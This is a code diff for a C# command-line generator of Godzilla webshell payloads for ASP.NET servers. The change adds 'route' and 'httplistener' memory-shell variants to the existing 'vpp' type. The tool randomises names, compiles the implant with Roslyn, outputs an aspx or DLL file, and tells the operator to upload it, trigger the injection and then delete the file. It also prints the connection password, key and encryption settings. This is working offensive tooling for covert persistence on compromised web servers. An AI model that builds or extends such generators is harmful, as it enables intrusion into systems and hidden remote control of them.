@@ -46,22 +46,20 @@ public static class GenerateCommand
             return 1;
         }
 
-        // Validate type/protocol for P1 scope
-        if (opts.ShellType != "vpp")
+        var validTypes = new[] { "vpp", "route", "httplistener" };
+        if (!validTypes.Contains(opts.ShellType))
         {
-            Console.Error.WriteLine($"Error: --type '{opts.ShellType}' not implemented in P1. Only 'vpp' is supported.");
+            Console.Error.WriteLine($"Error: --type '{opts.ShellType}' not supported. Valid: {string.Join(", ", validTypes)}");
             return 1;
         }
+
         if (opts.ShellProtocol != "godzilla")
         {
-            Console.Error.WriteLine($"Error: --shell '{opts.ShellProtocol}' not implemented in P1. Only 'godzilla' is supported.");
+            Console.Error.WriteLine($"Error: --shell '{opts.ShellProtocol}' not implemented. Only 'godzilla' is supported.");
             return 1;
         }
 
-        // Derive key: if not specified, use MD5(password)[0..16]
         string key = opts.Key ?? DeriveKey(opts.Password);
-
-        // Randomize
         var rng = new Randomizer.SeedRandom(opts.Seed);
         string ns = rng.NextNamespace();
         string cls = rng.NextClassName();
@@ -72,11 +70,9 @@ public static class GenerateCommand
         Console.WriteLine($"[+] path:      {virtualPath}");
         Console.WriteLine($"[+] key:       {key}");
 
-        // Render template
-        string source = RenderTemplate(opts, ns, cls, key);
+        string source = RenderTemplate(opts, ns, cls, key, virtualPath);
         Console.WriteLine("[+] template rendered");
 
-        // Compile
         var compiler = new Compiler.RoslynCompiler();
         var (success, dllBytes, diags) = compiler.Compile(source, opts.TargetFramework);
         if (!success)
@@ -88,8 +84,7 @@ public static class GenerateCommand
         }
         Console.WriteLine($"[+] compiled:  {dllBytes.Length} bytes ({opts.TargetFramework})");
 
-        // Format output
-        string output;
+        string? output = null;
         switch (opts.OutputFormat.ToLowerInvariant())
         {
             case "aspx":
@@ -105,37 +100,29 @@ public static class GenerateCommand
                     return 1;
                 }
                 File.WriteAllBytes(opts.OutputFile, dllBytes);
-                output = null!; // already written
                 break;
             default:
                 Console.Error.WriteLine($"Error: unknown format '{opts.OutputFormat}'");
                 return 1;
         }
 
-        // Write output
         if (output != null)
         {
             if (string.IsNullOrEmpty(opts.OutputFile))
-            {
                 Console.WriteLine(output);
-            }
             else
-            {
                 File.WriteAllText(opts.OutputFile, output);
-            }
         }
 
-        // Print connection info (FR-1.8)
         if (opts.OutputFile != null)
             Console.WriteLine($"[+] payload: {Path.GetFullPath(opts.OutputFile)}  (type={opts.ShellType}, shell={opts.ShellProtocol}, target={opts.TargetFramework})");
-        Console.WriteLine($"[+] upload and access once to trigger injection, then delete the file");
-        Console.WriteLine($"[+] Godzilla connection:");
+        Console.WriteLine("[+] upload and access once to trigger injection, then delete the file");
+        Console.WriteLine("[+] Godzilla connection:");
         Console.WriteLine($"    URL:    http://<target>/{virtualPath.TrimStart('/')}");
         Console.WriteLine($"    Pass:   {opts.Password}");
         Console.WriteLine($"    Key:    {key}");
         Console.WriteLine($"    Enc:    AES-128 (default)");
         Console.WriteLine($"    Type:   C#");
-
         return 0;
     }
 
@@ -152,13 +139,12 @@ public static class GenerateCommand
 
     static string DeriveKey(string password)
     {
-        // Godzilla convention: key = MD5(password)[0..15] (first 16 hex chars)
         using var md5 = System.Security.Cryptography.MD5.Create();
         byte[] hash = md5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password));
         return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant()[..16];
     }
 
-    static string RenderTemplate(GenerateOptions opts, string ns, string cls, string key)
+    static string RenderTemplate(GenerateOptions opts, string ns, string cls, string key, string virtualPath)
     {
         string quotedPass = "\"" + opts.Password.Replace("\"", "\\\"") + "\"";
         string quotedKey = "\"" + key.Replace("\"", "\\\"") + "\"";
@@ -173,11 +159,20 @@ public static class GenerateCommand
 
         string randomStr = Shells.GodzillaCSharp.RandomStringBlock;
 
-        return Templates.VppTemplate.Source
+        string template = opts.ShellType switch
+        {
+            "vpp" => Templates.VppTemplate.Source,
+            "route" => Templates.RouteTemplate.Source,
+            "httplistener" => Templates.HttpListenerTemplate.Source,
+            _ => throw new NotSupportedException(opts.ShellType)
+        };
+
+        return template
             .Replace("{{NAMESPACE}}", ns)
             .Replace("{{CLASSNAME}}", cls)
             .Replace("{{MEMBERS}}", members)
             .Replace("{{TRIGGER_BLOCK}}", trigger)
-            .Replace("{{RANDOM_STRING}}", randomStr);
+            .Replace("{{RANDOM_STRING}}", randomStr)
+            .Replace("{{LISTENER_URL}}", opts.Header ?? "http://*:80/godzilla/");
     }
 }
